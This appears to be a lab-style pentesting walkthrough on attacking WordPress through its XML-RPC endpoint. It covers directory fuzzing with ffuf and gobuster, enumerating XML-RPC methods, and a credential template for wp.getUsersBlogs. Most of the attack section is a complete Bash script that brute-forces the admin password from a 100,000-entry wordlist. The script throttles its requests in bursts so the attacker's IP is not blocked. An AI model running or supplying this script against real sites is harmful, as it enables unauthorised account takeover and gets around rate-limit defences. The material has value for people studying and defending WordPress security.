______

# WordPress Pentesting: Exploiting XML-RPC via Brute Force

### 1. Initial Reconnaissance & Fuzzing

The first step is to identify the attack surface by fuzzing the URL to discover hidden directories. Tools like **gobuster**, **wfuzz**, or **ffuf** are essential for this phase.

Bash

```
# Using ffuf
ffuf -u http://IP/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```

```
# Using gobuster
gobuster dir -u http://IP/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```

> **Note:** Remember that the **SecLists** repository structure may change; always verify your wordlist paths.

The fuzzing results revealed a **WordPress** installation. Since `searchsploit` didn't provide any immediate exploits, I opted for **Directory Listing** techniques to further explore the file structure.

#### .Identifying the Entry Point: XML-RPC

After checking `wp-login.php`, I tested the accessibility of `/xmlrpc.php`. The server responded with: `XML-RPC server accepts POST requests only`

This confirms the endpoint is active. Since this protocol communicates exclusively via **POST**, we must adjust our methodology (e.g., in Burp Suite, use `Right Click -> Change Request Method`).

- What is XML-RPC?

It is a **Remote Procedure Call** protocol that uses **XML** to encode its calls and **HTTP** as a transport mechanism.

- **RPC (Remote Procedure Call):** It’s like telling a remote computer: _"Hey! Execute this task for me and send back the result."_
- **In practice:** You wrap your instructions in an XML structure, send them via HTTP POST, and the server replies in XML.
##### . Enumerating Methods & Preparing the Attack

- Using resources like [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html?highlight=XML-RPC#xml-rpc), I identified the `system.listMethods` call to see what the server allows. Specifically, I looked for **`wp.getUsersBlogs`**, which is often used for credential validation.

**Method List Request:**

XML

```
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>
```

<img width="3247" height="860" alt="Captura de pantalla 2026-02-10 172354" src="https://github.com/user-attachments/assets/6c9c73aa-4db1-4330-9414-78a30f7fbba6" />
 
- Once the method was confirmed, I prepared a template to test credentials:

XML

```
<methodCall> 
  <methodName>wp.getUsersBlogs</methodName> 
  <params> 
    <param><value>admin</value></param> 
    <param><value>password_here</value></param> 
  </params> 
</methodCall>
```

- Testing a single request with `curl`:

```
curl -s -X POST "http://IP/wordpress/xmlrpc.php" -d@structure.xml
```

- To automate the process for the `admin` user, I developed a Bash script. I identified three specific error responses (invalid credentials, insufficient arguments, or malformed XML) to filter out failures and detect the correct password.

<img width="2610" height="1387" alt="Captura de pantalla 2026-02-11 200024" src="https://github.com/user-attachments/assets/4b0ff787-dc00-477c-baac-f6a3a9509513" />
 
<img width="2147" height="657" alt="Captura de pantalla 2026-02-12 001519" src="https://github.com/user-attachments/assets/de96076c-cac2-47fc-956b-448c00243e2f" />

- The script

```
#!/bin/bash

function ctrl_c(){
  echo -e "\n[+] Exiting..."
  exit 1
}

trap ctrl_c SIGINT

counter=0

function createXML(){
    password=$1
    valueXML="
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value><![CDATA[$password]]></value></param>
</params>
</methodCall>"

    echo "$valueXML" > data.xml
    consult=$(curl -s -X POST http://IP/wordpress/xmlrpc.php -d@data.xml)

    # Filter for success: Check if the response DOES NOT contain known error strings
    if [ ! "$(echo $consult | grep 'Incorrect username or password')" ] && \
       [ ! "$(echo $consult | grep 'Insufficient arguments')" ] && \
       [ ! "$(echo $consult | grep 'parse error')" ]; then
          echo -e "\n[+] Password Found! [+] -> $password"
          exit 0
    fi

    let counter+=1

    # Rate limiting: 2500 requests per burst, then sleep 2s to avoid IP blocking
    if [ "$counter" -eq 2500 ]; then
             echo " [!] $counter attempts reached. Cooling down for 2s..."
             let counter=0
             sleep 2
    fi
}

# Main loop using pv for progress monitoring
pv -l /opt/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt | while read password; do
   createXML "$password"
done
```

### Key points

- **CDATA Sections:** Used `<![CDATA[password]]>` to ensure the XML parser treats the password as raw text. This prevents the script from breaking if a password contains special characters like `&`, `<`, or `>`.

- **Progress Monitoring (`pv`):** Integrating `pv` provides a professional visual interface: `2.5k 0:00:45 [58.2 /s] [====>-----------] 25% ETA 0:02:15`
    
    - **2.5k:** Total passwords processed.
    - **[58.2/s]:** Real-time attack speed (requests per second).
    - **ETA:** Estimated time until wordlist completion.
    
- **Curl Data Handling:** The `-d @file` parameter is crucial. It instructs `curl` to read the body of the POST request from a file instead of the command line, which is essential for sending complex XML payloads.
